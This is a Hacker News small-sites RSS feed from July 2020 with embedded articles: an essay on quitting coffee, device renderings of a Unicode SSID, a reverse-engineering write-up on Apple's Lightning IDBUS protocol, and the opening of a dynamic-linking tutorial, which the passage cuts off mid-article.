<rss xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:atom="http://www.w3.org/2005/Atom" version="2.0">
    <channel>
        <title>
<![CDATA[Hacker News - Small Sites - Score >= 20]]>
        </title>
        <description>
<![CDATA[Hacker News stories from domains that aren't in the top 1M and that have a score of at least 20. Updated nightly via https://github.com/awendland/hacker-news-small-sites]]>
        </description>
        <link>https://news.ycombinator.com</link>
        <generator>RSS for Node</generator>
        <lastBuildDate>Sat, 04 Jul 2020 08:16:34 GMT</lastBuildDate>
        <atom:link href="https://raw.githubusercontent.com/awendland/hacker-news-small-sites/generated/feeds/hn-small-sites-score-20.xml" rel="self" type="application/rss+xml"></atom:link>
        <pubDate>Sat, 04 Jul 2020 08:16:34 GMT</pubDate>
        <language>
<![CDATA[en-US]]>
        </language>
        <managingEditor>
<![CDATA[me@alexwendland.com (Alex Wendland)]]>
        </managingEditor>
        <ttl>240</ttl>
        <item>
            <title>
<![CDATA[No More Coffee]]>
            </title>
            <description>
<![CDATA[
Score 48 | Comments 72 (<a href="https://news.ycombinator.com/item?id=23708204">thread link</a>) | @riverlong
<br/>
July 1, 2020 | https://jayriverlong.github.io/2020/06/30/coffee.html | <a href="https://web.archive.org/web/*/https://jayriverlong.github.io/2020/06/30/coffee.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="main" role="main"> <article role="article">  <p>I never identified as a coffee snob or someone with a serious habit – like everyone else, I made lots of self-deprecating jokes about how much coffee I drank – until one day I realized that I had been drinking more coffee than anyone else I knew for the past fifteen years.</p> <p>I started drinking coffee in high school. I would stay up all night competitively playing video games, and then head to school on two or three hours of sleep. If I tried to attend class, I would immediately pass out on my desk. There was a coffee machine in the cafeteria, where I would solve that problem by purchasing a cup of scalding-hot black coffee for fifty cents. It was shitty coffee, and I hated the flavor. But I needed it, and took the bitterness as fair punishment for not sleeping. That cup got me wired – the caffeine rush would electrify my body, and my hand would shake erratic, two-inch tall letters out of my Pilot V5.</p> <p>Two hours later, I’d get another cup, and that would last me into the early afternoon. I’d crash and fall asleep in class at 1:50pm, like clockwork. I’d get another cup at 2:00pm between classes, to carry me through the rest of the day. When I took my finals before graduating, the principal sent out a grade-wide complaint that too many coffee cups got littered outside the exam rooms. They were all mine. My #1 concern in high school was dying of a heart attack due to my completely insane sleep and caffeine habits.</p> <p>Somehow I survived high school. My sleep patterns would, over the course of the years, very slowly approach those of a normal person, but coffee stuck. I would drink it to help stay up late, or to wake me up after a short night. When things got really urgent I’d supplement with some Red Bull. My tastes advanced a little bit: I quit the punitive straight black coffee, and experimented with extravagances like sugar and milk. As I started to work internships near Starbuckses, I would get vanilla-hazelnut lattes, and my coffee runs were known for their consistency and punctuality.</p> <p>After college and graduate school, things kicked up a notch. Lots of people define their persona by their love of coffee, and I chose to be one of those. I drank coffee – lattes, in particular – religiously. My first business card’s title read <em>Caffeine Fiend</em>.<sup id="fnref:1"><a href="#fn:1">1</a></sup> I systematically sampled nearly every single cafe in San Francisco. Weirdly, I knew I didn’t really love lattes. I liked them, but a latte can ultimately only be so good. They were a habit, something I’d been doing for a long time, and had made part of my persona.<sup id="fnref:2"><a href="#fn:2">2</a></sup> Besides, I needed the kick. I realized that coffee was useful in technical, creative work not because it increases wakefulness, but because it increases <em>focus</em>. I had a latte machine in the office and a company to build, so at some point I hit ten cups a day.</p> <p>Enter March 2020. I had moved offices – no more free coffee – and was spending more on cinnamon lattes than some people spend on their mortgage. I was more cautious than most about COVID-19, and started isolating myself in early March. Being a coffee addict but not a true aficionado, I did not own anything in the way of a coffee machine. (I have never made much use of my kitchen.) I had no way to make coffee at home, and due to COVID I wasn’t in the mood to go out shopping. Almost four months later, I still haven’t had any coffee.</p> <p>Losing coffee was unpleasant at first. Abandoning a ritual can make the rest of the day feel weirdly incomplete. But I soon stopped missing or thinking about it. My quality of life had improved. With coffee, the regular motions of the day become exaggerated – there would be spikes of focus and the feeling of productivity<sup id="fnref:3"><a href="#fn:3">3</a></sup>, but there would also be caffeine crashes every four hours. The days that I used caffeine to push myself too far would invariably end in long headaches. I often felt very seriously drained at the end of the workday, and couldn’t do anything in the evening.</p> <p>The last four months, without coffee, have been much better. No headaches. No crashes. Consequently – and ironically – I’m now probably <em>more awake</em> on average throughout the day. I’ve been very surprised by how little I actually needed the caffeine, even in the morning after a short night. Thus, I’m not sure how much value caffeine actually provided me over the past few working years. I had so much of it that the beneficial effects certainly wore off (I would even drink coffee right before going to sleep). However, the downsides of coffee – trading in later energy to have more focus now, the drain and crash later in the day – never wore off.</p> <p>Ultimately, as COVID wraps up and things go back to normal, I don’t feel the need to pick up coffee again. Maybe I’ll try decaf for the pleasure of an evening latte, but I’m happy to kick the habit.</p> <hr>  <br> </article> </div></div>]]>
            </description>
            <link>https://jayriverlong.github.io/2020/06/30/coffee.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-23708204</guid>
            <pubDate>Wed, 01 Jul 2020 23:44:33 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Comparing how different devices display the SSID “á̶̛̛̓̿̈͐͆̐̇̒̑̈́͘͝aaa”]]>
            </title>
            <description>
<![CDATA[
Score 120 | Comments 24 (<a href="https://news.ycombinator.com/item?id=23708056">thread link</a>) | @herohamp
<br/>
July 1, 2020 | https://hamptonmoore.com/posts/weird-wifi-name-display/ | <a href="https://web.archive.org/web/*/https://hamptonmoore.com/posts/weird-wifi-name-display/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>   <p>After my recent post <a href="https://hamptonmoore.com/posts/fios-home-router-emoji/">Setting the SSID of a Fios Home Router to an emoji</a> I decided to set my WiFis SSID to “á̶̛̛̓̿̈͐͆̐̇̒̑̈́͘͝aaa”. That name is <a href="https://mothereff.in/byte-counter#a%CC%B6%CC%81%CC%93%CC%BF%CC%88%CC%9B%CC%9B%CD%90%CD%98%CD%86%CC%90%CD%9D%CC%87%CC%92%CC%91%CD%84aaa">36 octets</a> making it over the 32 octets maxium specified in the 2012 standard of 802.11 Section 6.3.11.2.2. My router just cut the name down to 32 octets though to stay complient. This was what was being sent according to <code>iw</code> <code>a\xcc\xb6\xcc\x81\xcc\x93\xcc\xbf\xcc\x88\xcc\x9b\xcc\x9b\xcd\x90\xcd\x98\xcd\x86\xcc\x90\xcd\x9d\xcc\x87\xcc\x92\xcc\x91\xcd</code> with the raw hex being <code>61ccb6cc81cc93ccbfcc88cc9bcc9bcd90cd98cd86cc90cd9dcc87cc92cc91cd</code>.</p> <p>I decided to see how this showed up on different devices and got some pretty strange results. Below are the devices tested sorted rougly to how they acted.</p> <p>Galaxy S8 running Android 9 with Kernel 4.4.153 <img src="https://cdn.hampton.pw/hampton.pw/resources/iosWifiBug/android.jpg" alt=""></p> <p>Amazon Firestick <img src="https://cdn.hampton.pw/hampton.pw/resources/iosWifiBug/firestick.jpg" alt=""></p> <p>Both the s8 and the Firestick are rendering the result in what I deem as the correct way with it showing the name just with some of the vertical characters cutoff.</p> <p>iPhone running iOS 13.5.1 <img src="https://cdn.hampton.pw/hampton.pw/resources/iosWifiBug/iphone-ios1351.jpg" alt=""></p> <p>Apple TV Second Generation <img src="https://cdn.hampton.pw/hampton.pw/resources/iosWifiBug/appletvgen2.jpg" alt=""></p> <p>Next comes the iPhone and Apple TV. At first I had no idea what they were rending these characters as. At first I thought it was just extended ascii but that third character, ∂, was not in extended ASCII. After asking around on the Apple discord server someone said it might be using the <a href="https://en.wikipedia.org/wiki/Mac_OS_Roman">Mac OS Roman</a> character set. It turns out it which is strange because iOS used UTF-8 internally and not Mac OS Roman as that was phased out with the release of Mac OS X.</p> <p>Speaking of Apple devices, there will not be any photos of MacOS though not from a lack of trying. I could not get either of my Macbook to acknowledge that this WiFi network existed. Neither the Wifi dropdown nor the airport commandline utility would show it.</p> <p>Windows 10 Pro 10.0.19041 <img src="https://cdn.hampton.pw/hampton.pw/resources/iosWifiBug/windows10.png" alt=""></p> <p><del>Windows 10 is rendering it using what I believe to be the UTF-8 characters of each octet. This matches what the raw hex of the wifi name would become if you split it up into 8bit bytes and used that as UTF-8 chars.</del> It was pointed out by <a href="https://twitter.com/theFerdi265">@theFerdi265</a> that this is not the first set of UTF-8 chars like I thought. Instead it is <a href="https://en.wikipedia.org/wiki/Windows-1252">Windows-1252</a>, a single-byte character encoding of the Latin alphabet, used by default in the legacy components of Microsoft Windows for English and some other European languages.</p> <p>Chromebook running ChromeOS 83.0.4103.97 <img src="https://cdn.hampton.pw/hampton.pw/resources/iosWifiBug/chromeos.jpg" alt=""></p> <p>ChromeOS is just freaking out not knowing how to render any of the charaters besides the singular a.</p> <p>Kindle Paperwhite running Firmware 5.10.2 <img src="https://cdn.hampton.pw/hampton.pw/resources/iosWifiBug/kindlepaperwhite.jpg" alt=""></p> <p>Vizio M55-C2 TV <img src="https://cdn.hampton.pw/hampton.pw/resources/iosWifiBug/viziom55-c2.jpg" alt=""></p> <p>Both the Kindle and Vizio TV are showing what <code>iw</code> returned with the a and then escaped hexademical characters.</p> <p>I have no published a follow up to this post, <a href="https://hamptonmoore.com/posts/weird-wifi-names-cont/">here</a>.</p> <p>Discuss this post on Hacker News <a href="https://news.ycombinator.com/item?id=23708056">here</a></p> <hr> <p> Hello reader. I do not normally like to put advertisements or promotions on my website, but recently a good friend of my Jaden Ann Scrivener died in a car crash. She was known in the community as the most caring and energetic person around. She was a beam of sunshine and happiness brightening up the day of anyone who interacted with her. If you could <a href="https://www.aplos.com/aws/give/RayofHopeMedicalMissionsInc/Jaden">please donate to her memorial fund</a>. All the proceeds will go to the <a href="https://www.rohmm.org/">Ray of Hope Medical Missions</a> which facilitates life-changing surgeries, reduces infant mortality, and provides mission opportunities locally. </p> </article></div>]]>
            </description>
            <link>https://hamptonmoore.com/posts/weird-wifi-name-display/</link>
            <guid isPermaLink="false">hacker-news-small-sites-23708056</guid>
            <pubDate>Wed, 01 Jul 2020 23:26:22 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Apple Lightning]]>
            </title>
            <description>
<![CDATA[
Score 499 | Comments 199 (<a href="https://news.ycombinator.com/item?id=23705546">thread link</a>) | @captn3m0
<br/>
July 1, 2020 | https://nyansatan.github.io/lightning/ | <a href="https://web.archive.org/web/*/https://nyansatan.github.io/lightning/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

                
                <p>Created on 1.7.20</p>

                <p>
                    Here's my little article about (almost) everything I know about Apple Lightning and related technologies: <b>Tristar</b>, <b>Hydra</b>, <b>HiFive</b>, <b>SDQ</b>, <b>IDBUS</b> and etc. But first a tiny warning...
                </p>

                <p><i>
                        Read this article on your own <b>risk</b>! The information in this artcile is based on a lot of AppleInternal materials (leaked datasheets, schematics, source codes) I read in a diagonal direction. And of course on my own research too. I have to warn you, the reader, that I have never done such a research before. Thus, this write-up might use incorrect or just weird terms and turn out partially or completely <b>wrong</b>! 
                    </i>
                </p>

                <p>
                    Before going <i>deeper</i>, let's briefly sort out the terms:
                </p>

                <div>
                    <h2>What's Lightning?</h2>

                    <p><img src="https://nyansatan.github.io/lightning/resources/lightning_port_pinout.jpg"><br>

                    <b>Lightning</b> - is a digital interface used in most of the Apple's iOS devices since late 2012. Replaced the old 30-pin connector</p><p>

                    

                    You can see the female port pinout on the picture above and the connector pinout on the picture below:<br>

                    <img src="https://nyansatan.github.io/lightning/resources/lightning_connector_pinout.jpg"><br>

                    Please pay attention to the fact that in the connector, pins on both sides of connector aren't wired in exact same order. Thus, a host device have to detect orientation of a cable before doing anything else</p><p>
                    
                    

                    Though it's not always applicable. Many Lightning accessories I've played with have mirrored pinouts in their connectors
                </p></div>

                <div>
                    <h2>What're Tristar and Hydra?</h2>

                    <p><img src="https://nyansatan.github.io/lightning/resources/tristar_logo.png"><br>

                    <b>Tristar</b> - is the integrated circuit embedded in every device shipped with Lightning female port. Basically, it's a MUX:<br>

                    <img src="https://nyansatan.github.io/lightning/resources/tristar_schematic.png">

                    Among many other things, its main purpose is to communicate with Lightning male connector once one was connected - detect orientation and detect <b>Accessory ID</b> and route internal interfaces like USB, UART and SWD accordingly</p><p>

                    

                    <b>Hydra</b> - is the new variant of Tristar used since iPhone 8/X. The most significant change appears to be a support of wireless charging, but that's to be verified:<br>
                    
                    <img src="https://nyansatan.github.io/lightning/resources/hydra_schematic.png"><br>

                    There're 5 major Tristar/Hydra variants known to me:</p><ul>
                        <li><b>TI THS7383</b> - first-gen Tristar used in iPad mini 1 and iPad 4</li>
                        <li><b>NXP CBTL1608A1</b> - first-gen Tristar used in iPhone 5 and iPod touch 5</li>
                        <li><b>NXP CBTL1609A1</b> - mysterious first-gen Tristar used in iPod nano 7 - <a target="_blank" href="https://www.ifixit.com/Teardown/iPod+Nano+7th+Generation+Teardown/10826#s38931">source</a></li>
                        <li><b>NXP CBTL1610Ax</b> - second-gen Tristar used since iPhone 5C/5S and apparently everything else that doesn't support wireless charging. There're multiple generations of this one (<b>x</b> - number of generation)</li>
                        <li><b>NXP CBTL1612Ax</b> - Hydra used since iPhone 8/X and apparently everything else that supports wireless charging (<b>x</b> - number of generation)</li>
                    </ul><p>

                    From now on, I'll only use the term <b>Tristar</b>, but keep in mind that it will also mean <b>Hydra</b> as well, as they are very similar in the most of aspects that are gonna be covered in this text
                </p></div>

                <div>
                    <h2>What's HiFive?</h2>

                    <p><img src="https://nyansatan.github.io/lightning/resources/lightning_connector.svg"><br>

                    <b>HiFive</b> - is Lightning slave, i.e. a male connector. It contains a logical element as well - that chip is known as <b>SN2025</b>/<b>BQ2025</b>
                </p></div>

                <div>
                    <h2>What're SDQ and IDBUS?</h2>

                    <p><img src="https://nyansatan.github.io/lightning/resources/idbus_little.png"><br>

                    These 2 terms are often referred as kind of synonyms. For convinience, I'll only use term <b>IDBUS</b> from now on, as it seems more correct to me (and that's how this technology called in the THS7383 datasheet)</p><p>

                    

                    So, <b>IDBUS</b> - is a digital protocol used for negotiations between Tristar and HiFive. Very similar to <a target="_blank" href="https://en.wikipedia.org/wiki/1-Wire">Onewire protocol</a></p></div>

                <div>
                    <h2>Now we can play</h2><p>

                    Let's sniff the negotiations between Tristar and HiFive. Take a logic analyzer, a Lightning male-to-female passthrough breakout board, some accessory (normal Lightning to USB cable would fit just fine) and of course some device with Lightning port</p><p>

                    

                    First connect logic analyzer's channels to both <b>ID</b> lines of the breakout (pins 4 and 8) and connect the breakout to the device, but do not connect the accessory just yet:<br>

                    <img src="https://nyansatan.github.io/lightning/resources/setup_1.jpg"><br>

                    Right after that start sampling (any rate from 2 MHz and up should be fine). You'll see something like this:<br>

                    <img src="https://nyansatan.github.io/lightning/resources/id_lines_activity.png"><br>

                    As you can see, Tristar polls each ID line by rotation - one after another. But since we didn't connect any accessory, the polling obviously fails. At some point the device will grow tired of this endless stream of failures and stop it. Meanwhile let's examine what exactly happens while polling:<br>

                    <img src="https://nyansatan.github.io/lightning/resources/polling_explained_1.png"><br>

                    First, we can see a long interval (~1.1 milliseconds) when the level is just high and nothing else is happening:<br>

                    <img src="https://nyansatan.github.io/lightning/resources/charge.png"><br>

                    Apparently that time is used to charge internal HiFive's capacitor - the energy from it will be then used to power-up its internal logic chips</p><p>

                    

                    What happens next is far more interesting:<br>

                    <img src="https://nyansatan.github.io/lightning/resources/meaningful.png"><br>

                    Obviously, that's some data flowing. But how to interpret it? How to decode it? Let's virtually split it to almost the least least significant parts - to something that I call <b>words</b>:

                    <img src="https://nyansatan.github.io/lightning/resources/meaningful_splitted.png"><br>

                    So basically a <b>word</b> is a combination of <b>fall</b>-<b>rise</b>-<b>fall</b>:<br>

                    <img src="https://nyansatan.github.io/lightning/resources/word_splitted.png"></p><ul>
                        <li><span>Meaningful Stage</span> - time interval taken by this stage defines meaning of a word</li>
                        <li><span>Recovery Stage</span> - time interval which is apparently required for processing the <span>Meaningful Stage</span> on recieving side and/or preparing the next word on sending stage</li>
                    </ul><p>

                    Here is a table of known word types with their time intervals for both stages we discussed above (all units are in microseconds):</p><table>
                        <tbody><tr>
                            <th></th>
                            <th colspan="3">Meaningful</th>
                            <th colspan="2">Recovery</th>
                        </tr>
                        <tr>
                            <th>Word</th>
                            <th>Min</th>
                            <th>Typ</th>
                            <th>Max</th>
                            <th>Min</th>
                            <th>Typ</th>
                        </tr>
                        <tr>
                            <td><b>BREAK</b></td>
                            <td>12</td>
                            <td>14</td>
                            <td>16</td>
                            <td>2.5</td>
                            <td>4.5</td>
                        </tr>
                        <tr>
                            <td><b>WAKE</b></td>
                            <td>22</td>
                            <td>24</td>
                            <td>27</td>
                            <td></td>
                            <td>1100?</td>
                        </tr>
                        <tr>
                            <td><b>ZERO</b></td>
                            <td>6</td>
                            <td>7</td>
                            <td>8</td>
                            <td></td>
                            <td>3</td>
                        </tr>
                        <tr>
                            <td><b>ONE</b></td>
                            <td>1</td>
                            <td>1.7</td>
                            <td>2.5</td>
                            <td></td>
                            <td>8.5</td>
                        </tr>
                        <tr>
                            <td><b>ZERO with STOP*</b></td>
                            <td>6</td>
                            <td>7</td>
                            <td>8</td>
                            <td></td>
                            <td>16</td>
                        </tr>
                        <tr>
                            <td><b>ONE with STOP*</b></td>
                            <td>1</td>
                            <td>1.7</td>
                            <td>2.5</td>
                            <td></td>
                            <td>21</td>
                        </tr>
                    </tbody></table>

                    <p>

                    * - <b>STOP</b> is used when it's a last bit in a byte</p><p>

                    

                    Using the above table we can now build a simple decoder of the protocol:<br>

                    <img src="https://nyansatan.github.io/lightning/resources/decoded.png"><br>

                    As you can see, the first word a host sends is <b>BREAK</b> - when Tristar wants to send a new request, it always starts with it. Then comes a data stage. Please pay attention to the fact that last (8th) bit of a byte has longer <span>Recovery Stage</span>. When a data stage is over, a host sends another <b>BREAK</b>. Then a slave must send a reply (after at least a 2.5 us delay - see the table). Tristar will wait for around 2.2 ms for a reply. If it's not issued in this time interval, Tristar will try to poll another ID line</p><p>

                    

                    Now let's examine the data stage on the example above - <span>0x74 0x00 0x02 0x1f</span>:

                    </p><ul>
                        <li><span>0x74</span> - request/response type. Always even for request, always odd for response (request type + 1)</li>
                        <li><span>0x00 0x02</span> - actual data. Can be empty</li>
                        <li><span>0x1f</span> - CRC8 of both the request type byte and the whole data (polynomial - 0x31, initial value - 0xff)</li>
                    </ul><p>

                    Let's connect some accessory to our setup and see what happens. I'll use Apple's original Lightning to USB cable:<br>

                    <img src="https://nyansatan.github.io/lightning/resources/setup_2.jpg"><br>

                    And here is what appears on IDBUS after a 0x74 request:<br>

                    <img src="https://nyansatan.github.io/lightning/resources/response_0x75.png"><br>

                    HiFive replied! And if you scroll further you'll see a lot of other request/response pairs:<br>

                    <img src="https://nyansatan.github.io/lightning/resources/response_0x79.png"><br>

                    Some requests do not need a response though:

                    <img src="https://nyansatan.github.io/lightning/resources/request_0x84.png"><br>
                </p></div>

                <div>
                    <h2>Interpreting IDBUS requests and responses</h2><p>

                    The most important IDBUS request is <b>0x74</b> - it is used for two purposes: to tell HiFive enable full current (in case that's supported by an accessory) and to ask it about pin configuration the cable supports and some other metadata</p><p>

                    

                    Not too much is known about how response 0x75's data is encoded. But some bits were available in a certain old Tristar datasheet:</p><table>
                        <caption>First byte of 0x75 response data</caption>
                        <tbody><tr>
                            <th>7</th>
                            <th>6</th>
                            <th>5</th>
                            <th>4</th>
                            <th>3</th>
                            <th>2</th>
                            <th>1</th>
                            <th>0</th>
                        </tr>
                        <tr>
                            <td colspan="2">ACCx</td>
                            <td colspan="2">Dx</td>
                            <td colspan="4">DATA[43:40]</td>
                        </tr>
                    </tbody></table>

                    <br>

                    <div>
                        <table>
                            <caption>ACCx configuration when ID is found on ID0</caption>
                            <tbody><tr>
                                <th>ACCx[1:0]</th>
                                <th>ACC1</th>
                                <th>ACC2</th>
                                <th>HOST_RESET</th>
                            </tr>
                            <tr>
                                <td><b>00</b></td>
                                <td>Hi-Z (IDBUS)</td>
                                <td>Hi-Z</td>
                                <td>Hi-Z</td>
                            </tr>
                            <tr>
                                <td><b>01</b></td>
                                <td>UART1_RX</td>
                                <td>UART1_TX</td>
                                <td>Hi-Z</td>
                            </tr>
                            <tr>
                                <td><b>10</b></td>
                                <td>JTAG_DIO</td>
                                <td>JTAG_CLK</td>
                                <td>Hi-Z</td>
                            </tr>
                            <tr>
                                <td><b>11</b></td>
                                <td>Hi-Z</td>
                                <td>Hi-Z</td>
                                <td>HIGH</td>
                            </tr>
                        </tbody></table>
                    </div>

                    <br>

                    <div>
                        <table>
                            <caption>ACCx configuration when ID is found on ID1</caption>
                            <tbody><tr>
                                <th>ACCx[1:0]</th>
                                <th>ACC1</th>
                                <th>ACC2</th>
                                <th>HOST_RESET</th>
                            </tr>
                            <tr>
                                <td><b>00</b></td>
                                <td>Hi-Z</td>
                                <td>Hi-Z (IDBUS)</td>
                                <td>Hi-Z</td>
                            </tr>
                            <tr>
                                <td><b>01</b></td>
                                <td>UART1_RX</td>
                                <td>UART1_TX</td>
                                <td>Hi-Z</td>
                            </tr>
                            <tr>
                                <td><b>10</b></td>
                                <td>JTAG_DIO</td>
                                <td>JTAG_CLK</td>
                                <td>Hi-Z</td>
                            </tr>
                            <tr>
                                <td><b>11</b></td>
                                <td>Hi-Z</td>
                                <td>Hi-Z</td>
                                <td>HIGH</td>
                            </tr>
                        </tbody></table>
                    </div>

                    <br>

                    <div>
                        <table>
                            <caption>Dx configuration when ID is found on ID0</caption>
                            <tbody><tr>
                                <th>Dx[1:0]</th>
                                <th>DP1</th>
                                <th>DN1</th>
                                <th>DP2</th>
                                <th>DN2</th>
                            </tr>
                            <tr>
                                <td><b>00</b></td>
                                <td>Hi-Z</td>
                                <td>Hi-Z</td>
                                <td>Hi-Z</td>
                                <td>Hi-Z</td>
                            </tr>
                            <tr>
                                <td><b>01</b></td>
                                <td>USB0_DP</td>
                                <td>USB0_DN</td>
                                <td>Hi-Z</td>
                                <td>Hi-Z</td>
                            </tr>
                            <tr>
                                <td><b>10</b></td>
                                <td>USB0_DP</td>
                                <td>USB0_DN</td>
                                <td>UART1_TX</td>
                                <td>UART1_RX</td>
                            </tr>
                            <tr>
                                <td><b>11</b></td>
                                <td>Hi-Z</td>
                                <td>Hi-Z</td>
                                <td>Hi-Z</td>
                                <td>Hi-Z</td>
                            </tr>
                        </tbody></table>
                    </div>

                    <br>

                    <div>
                        <table>
                            <caption>Dx configuration when ID is found on ID1</caption>
                            <tbody><tr>
                                <th>Dx[1:0]</th>
                                <th>DP1</th>
                                <th>DN1</th>
                                <th>DP2</th>
                                <th>DN2</th>
                            </tr>
                            <tr>
                                <td><b>00</b></td>
                                <td>Hi-Z</td>
                                <td>Hi-Z</td>
                                <td>Hi-Z</td>
                                <td>Hi-Z</td>
                            </tr>
                            <tr>
                                <td><b>01</b></td>
                                <td>Hi-Z</td>
                                <td>Hi-Z</td>
                                <td>USB0_DP</td>
                                <td>USB0_DN</td>
                            </tr>
                            <tr>
                                <td><b>10</b></td>
                                <td>USB0_DP</td>
                                <td>USB0_DN</td>
                                <td>UART1_TX</td>
                                <td>UART1_RX</td>
                            </tr>
                            <tr>
                                <td><b>11</b></td>
                                <td>Hi-Z</td>
                                <td>Hi-Z</td>
                                <td>Hi-Z</td>
                                <td>Hi-Z</td>
                            </tr>
                        </tbody></table>
                    </div>
                    <p>

                    Using the tables above let's decode our cable's ID (<span>10 0C 00 00 00 00</span>) with keeping in mind that ID line was found on ID0 pin:<br>

                    h
                    </p><table>
                        <caption>First byte of the cable's 0x75 response data</caption>
                        <tbody><tr>
                            <th>7</th>
                            <th>6</th>
                            <th>5</th>
                            <th>4</th>
                            <th>3</th>
                            <th>2</th>
                            <th>1</th>
                            <th>0</th>
                        </tr>
                        <tr>
                            <td colspan="2">ACCx</td>
                            <td colspan="2">Dx</td>
                            <td colspan="4">DATA[43:40]</td>
                        </tr>
                        <tr>
                            <td>0</td>
                            <td>0</td>
                            <td>0</td>
                            <td>1</td>
                            <td>0</td>
                            <td>0</td>
                            <td>0</td>
                            <td>0</td>
                        </tr></tbody></table>
    
                    <p>

                    So, ACCx is <span>00</span> meaning that ID0 pin will just stick with IDBUS, and Dx is <span>01</span> meaning that DP1/DN1 pins will be configured as USB0_DP/USB0_DN. Just …</p></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://nyansatan.github.io/lightning/">https://nyansatan.github.io/lightning/</a></em></p>]]>
            </description>
            <link>https://nyansatan.github.io/lightning/</link>
            <guid isPermaLink="false">hacker-news-small-sites-23705546</guid>
            <pubDate>Wed, 01 Jul 2020 19:37:18 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Dynamic Linking]]>
            </title>
            <description>
<![CDATA[
Score 46 | Comments 9 (<a href="https://news.ycombinator.com/item?id=23704160">thread link</a>) | @azhenley
<br/>
July 1, 2020 | https://blog.stephenmarz.com/2020/06/22/dynamic-linking/ | <a href="https://web.archive.org/web/*/https://blog.stephenmarz.com/2020/06/22/dynamic-linking/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
								
								<div>
									
<p>Static vs dynamic linking usually has to do with our tolerance for the size of our final executable. A<em> static </em>executable contains all code necessary to run the executable, so the operating system loads the executable into memory, and it’s off to the races. However, if we keep duplicating code over and over again, such as printf, then it starts to use up more and more space. So, a <em>dynamic</em> executable means that we only store <em>stubs</em> in the executable. Whenever we want to access printf, it goes out to a <em>dynamic linker</em> and loads the code essentially <em>on demand</em>. So, we sacrifice a tiny bit of speed for a much smaller executable.</p>



<hr>



<h2>Contents</h2>



<ol><li><a href="#linking">What is Linking</a></li><li><a href="#finding">Finding Symbols</a></li><li><a href="#static">Static Libraries (archives)</a></li><li><a href="#dynamic">Dynamic Libraries (shared objects)</a></li><li><a href="#analyze">Analyzing a Shared Program</a></li><li><a href="#unresolved">Unresolved Symbols at Run Time</a></li><li><a href="#plt">Procedure Linkage Table (plt)</a></li><li><a href="#got">Global Offset Table (got)</a></li><li><a href="#updating-got">Loading and Updating the GOT</a></li><li><a href="#conclusion">Conclusion and Further Reading</a></li><li><a href="#video">Video</a></li></ol>



<hr>



<h2 id="linking">What is Linking?</h2>



<p>When I hear someone talk about <em>compiling</em> their program into an executable, they are really eliding over several stages. The definition of  compiling is to <em>produce something by combining information collected from different sources.</em> In computing, we generally think of compiling as turning a higher-level language, such as C, into a lower-level code, such as assembly.</p>



<p>The final stage before we get an executable is the <em>linking</em> stage. This is where we <em>link</em> (hence the name) all sources together to produce one coherent executable. This is also where all outstanding symbols need to be resolved. Symbol is just fancy for the name of a function or global variable.</p>



<p>We can take a look at <em>object code, </em>which is what we get after we assemble but before we link. Here’s an object dump of an example program.</p>



<pre data-enlighter-language="c" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
void some_func(int a, int b);

int main(int argc, char *argv[]) {
	if (argc &lt; 3) {
		printf("Not enough arguments.\n");
		return -1;
	}

	int a = atoi(argv[1]);
	int b = atoi(argv[2]);

	some_func(a, b);

	return 0;
}</pre>



<p>This code produces the following object code, which I disassemble using objdump for RISC-V.</p>



<div><figure><img src="https://blog.stephenmarz.com/wp-content/uploads/2020/05/image-23.png" alt="" width="500" height="341" srcset="https://blog.stephenmarz.com/wp-content/uploads/2020/05/image-23.png 667w, https://blog.stephenmarz.com/wp-content/uploads/2020/05/image-23-300x204.png 300w" sizes="(max-width: 500px) 100vw, 500px"></figure></div>



<p>Notice that the function some_func has been prototyped, but has not been defined. This will be the responsibility of the linker to find the symbol some_func and add it into our program. Notice what happens when I try to link this program without ever defining some_func.</p>



<pre>/opt/riscv_1/lib/gcc/riscv64-unknown-linux-gnu/9.2.0/../../../../riscv64-unknown-linux-gnu/bin/ld: /tmp/ccmgFc75.o:
<br>
in function .L2': test.c:(.text+0x62): undefined reference to some_func'
<br>
collect2: error: ld returned 1 exit status</pre>



<p>The linker is looking for the symbol some_func, but it cannot find it, so we get an <em>undefined reference</em>. We know this is at the linker stage because the error is “ld returned 1 exit status”. The “ld” means “linker”.</p>



<p>We also can see that the address of the function main is 0, this is because we haven’t linked a program. So, our object code just contains <em>bubbles</em> of code, which will then be placed into our executable at certain locations by the linker.</p>



<hr>



<h2 id="finding">Finding Symbols</h2>



<p>If we use the command <em>nm</em>, which is used to list symbols in an object file, we can see all of the <em>unresolved</em> symbols. Our object code is looking for these, but it doesn’t need to know where they are until we have a full executable program.</p>



<div><figure><img src="https://blog.stephenmarz.com/wp-content/uploads/2020/05/image-24.png" alt="" srcset="https://blog.stephenmarz.com/wp-content/uploads/2020/05/image-24.png 317w, https://blog.stephenmarz.com/wp-content/uploads/2020/05/image-24-300x169.png 300w" sizes="(max-width: 317px) 100vw, 317px"></figure></div>



<p>You can see that in this object file, the linker has a little bit of work to do. It must find atoi, puts, and some_func, which are flagged as U for undefined symbols. When we execute the linker, we will specify certain libraries, such as -lc (the C library), which most of these symbols will be found. Our some_func has never been defined, so our linker cannot really succeed until we define it somewhere.</p>



<hr>



<h2 id="static">Static Libraries (archives)</h2>



<p>Archive files generally end in .a and contain code and other information that will be added to the final executable. Essentially, archive files are just a collection of object files into one file. Therefore, when we link to an archive file, we extract the actual code from the object code into our executable. The nice thing about archive files is that we don’t need to add ALL symbols into our executable–we only need those symbols that need to be used.</p>



<p>Usually, we have archive versions of all libraries to allow for <em>static</em> executables. These executables are those that don’t need any additional loading to run. In other words, these are self-contained files. The linker stage will pull in the code directly from the .a file into the executable, and all is done. The more code that the linker pulls in, the larger the executable will be.</p>



<p>Let’s go ahead and define some_func and see how linking works.</p>



